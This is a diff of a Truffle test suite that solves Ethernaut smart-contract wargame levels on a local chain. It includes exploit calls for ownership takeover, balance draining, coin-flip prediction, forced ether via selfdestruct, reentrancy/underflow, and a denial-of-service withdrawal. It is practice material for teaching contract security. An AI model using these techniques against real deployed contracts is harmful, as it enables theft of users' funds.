@@ -36,6 +36,7 @@ const DenialExploit        = artifacts.require("DenialExploit");
 
 const { expectRevert }       = require('@openzeppelin/test-helpers');
 const { getContractAddress } = require("@ethersproject/address");
+const truffleAssert          = require("truffle-assertions");
 
 contract("Ethernaut", (accounts) => {
 	const owner   = accounts[0];
@@ -69,29 +70,15 @@ contract("Ethernaut", (accounts) => {
 			await web3.eth.sendTransaction({ from: hacker, to: contract.address, value: amount, data: null }); // trigger the receive() function to set the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
-			try {
-				await contract.withdraw(); // withdraw the whole balance to pass the level
-			} catch (err) {
-				const exceptionCurrent = err.reason;
-				const exceptionExpected = "caller is not the owner";
-				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 1.");
-			}
+			await contract.withdraw({ from: hacker }); // withdraw the whole balance to pass the level
 			// another example without class objects
-			/*
-			const instance = Fallback.networks["5777"].address;
-			const contract = new web3.eth.Contract(Fallback.abi, instance);
-			await contract.methods.contribute().call({ from: hacker, value: amount });
-			await web3.eth.sendTransaction({ from: hacker, to: instance, value: amount, data: null });
-			const ownerCurrent = await contract.methods.owner().call();
-			assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
-			try {
-				await contract.methods.withdraw().call();
-			} catch (err) {
-				const exceptionCurrent = err.reason;
-				const exceptionExpected = "caller is not the owner";
-				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 1.");
-			}
-			*/
+			// const instance = Fallback.networks["5777"].address;
+			// const contract = new web3.eth.Contract(Fallback.abi, instance);
+			// await contract.methods.contribute().call({ from: hacker, value: amount });
+			// await web3.eth.sendTransaction({ from: hacker, to: instance, value: amount, data: null });
+			// const ownerCurrent = await contract.methods.owner().call();
+			// assert.equal(hacker, ownerCurrent, "Failed to pass level 1.");
+			// await contract.withdraw({ from: hacker });
 		});
 	});
 
@@ -105,13 +92,7 @@ contract("Ethernaut", (accounts) => {
 			await contract.Fal1out({ from: hacker, value: amount }); // typo in the constructor function makes it a normal function | setting the hacker as the new owner
 			const ownerCurrent = await contract.owner();
 			assert.equal(hacker, ownerCurrent, "Failed to pass level 2.");
-			try {
-				await contract.collectAllocations({ from: hacker }); // withdraw the whole balance to pass the level
-			} catch (err) {
-				const exceptionCurrent = err.reason;
-				const exceptionExpected = "caller is not the owner";
-				assert.equal(exceptionCurrent, exceptionExpected, "Failed to pass level 2.");
-			}
+			await contract.collectAllocations({ from: hacker }); // withdraw the whole balance to pass the level
 		});
 	});
 
@@ -129,7 +110,7 @@ contract("Ethernaut", (accounts) => {
 				await exploit.run(contract.address); // reverse engineer the algorithm to always win
 			}
 			const count = await web3.utils.toBN(await contract.consecutiveWins());
-			assert.equal(count, 10, "Failed to pass level 3."); // get 10 wins in a row to pass the level
+			assert.equal(10, count, "Failed to pass level 3."); // get 10 wins in a row to pass the level
 		});
 	});
 
@@ -156,7 +137,7 @@ contract("Ethernaut", (accounts) => {
 		});
 		it("Exploit", async () => {
 			const contract = await Token.new(amount, { from: owner });
-			await expectRevert.unspecified(contract.transfer(user, amount + 1, { from: owner })); // cause the integer underflow to pass the level
+			await expectRevert.unspecified(contract.transfer(user, amount + 1, { from: owner })); // cause an integer underflow to pass the level | solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
 		});
 	});
 
@@ -185,9 +166,9 @@ contract("Ethernaut", (accounts) => {
 			const exploit = await ForceExploit.new();
 			const balanceOld = await web3.eth.getBalance(contract.address);
 			await web3.eth.sendTransaction({ from: hacker, to: exploit.address, value: amount, data: null }); // send some balance to the exploit contract using the receive() function
-			await exploit.destroy(contract.address); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
+			await exploit.run(contract.address); // forcefully send all the balance from the exploit contract to the target contract using selfdestruct() function
 			const balanceNew = await web3.eth.getBalance(contract.address);
-			assert.equal(balanceNew - balanceOld, amount, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
+			assert(balanceNew > balanceOld, "Failed to pass level 7."); // make the target's contract balance greater than zero to pass the level
 		});
 	});
 
@@ -235,7 +216,7 @@ contract("Ethernaut", (accounts) => {
 			// const balanceOld = await web3.eth.getBalance(contract.address);
 			// await exploit.run(contract.address, { value: amount, gas: 4465030 }); // create the integer underflow using reentrancy
 			// const balanceNew = await web3.eth.getBalance(contract.address);
-			// assert(balanceNew > balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
+			// assert(balanceNew < balanceOld, "Failed to pass level 10."); // withdraw the whole balance to pass the level
 			await expectRevert.unspecified(exploit.run(contract.address, { value: amount, gas: 4465030 })); // solidity v0.8.0+ is immune to underflows and overflows and will revert any such transaction
 		});
 	});
@@ -366,7 +347,6 @@ contract("Ethernaut", (accounts) => {
 			const balanceTargetCurrent = await web3.eth.getBalance(targetAddress);
 			const balanceHackerNew = await web3.eth.getBalance(hacker);
 			assert(balanceHackerNew > balanceHackerOld, "Failed to pass level 17."); // withdraw the whole balance to pass the level
-			assert.equal(balanceTargetCurrent, 0, "Failed to pass level 17.");
 		});
 	});
 
@@ -381,12 +361,13 @@ contract("Ethernaut", (accounts) => {
 			const contract = await MagicNumber.new();
 			const exploit = await MagicNumberExploit.new();
 			await exploit.run(contract.address);
-			assert(await contract.validate(), "Failed to pass level 18.");
+			const validateCurrent = await contract.validate();
+			assert(validateCurrent, "Failed to pass level 18.");
 			// another example without exploit contract
 			// const bytecode = "0x600A600C600039600A6000F3602A60005260206000F3";
 			// const txn = await web3.eth.sendTransaction({ from: hacker, data: bytecode }); // to create a smart contract, send a transaction without the recipient
 			// await contract.setSolver(txn.contractAddress);
-			// assert(await contract.validate(), "Failed to pass level 18.");
+			// assert(validateCurrent, "Failed to pass level 18.");
 		});
 	});
 
@@ -419,11 +400,9 @@ contract("Ethernaut", (accounts) => {
 			const exploit = await DenialExploit.new();
 			await web3.eth.sendTransaction({ from: owner, to: contract.address, value: amount, data: null }); // deposit some ETH to the target's contract
 			await contract.setWithdrawPartner(exploit.address); // set the hacker's contract as the partner, hacker's contract will always revert on target's contract withdrawal
-			// await exploit.run(contract.address)
-			const balanceOld = await contract.contractBalance();
-			await expectRevert.unspecified(contract.withdraw(), { gas: 128}); // DoS the withdrawal to pass the level
-			const balanceNew = await contract.contractBalance();
-			assert.equal(balanceOld, balanceNew, "Failed to pass level 20."); // balance must stay unchanged to pass the level
+			await truffleAssert.fails(contract.withdraw({ gas: 91000 }), truffleAssert.ErrorType.OUT_OF_GAS); // DoS the withdrawal to pass the level | balance must stay unchanged to pass the level
 		});
 	});
+
+	// moving on to Hardhat because Truffle is now depricated
 });
